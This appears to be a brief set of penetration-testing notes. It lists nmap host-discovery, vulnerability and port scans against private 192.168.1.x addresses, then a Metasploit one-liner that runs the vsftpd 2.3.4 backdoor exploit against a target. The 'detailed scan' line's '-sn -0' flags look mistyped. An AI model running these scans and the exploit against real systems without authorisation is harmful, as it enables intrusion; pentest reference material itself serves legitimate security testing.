### penetration testing
##### detailed scan
nmap -sn -0 192.168.1.0/24 
##### vulnerability scan
nmap --script vuln 192.168.1.10
##### port discovery
nmap -p- 192.168.1.10
##### metasploit 
msfconsole -q -x "
use exploit/unix/ftp/vsftpd_234_backdoor;
set RHOSTS 192.168.1.10;
run;
exit"
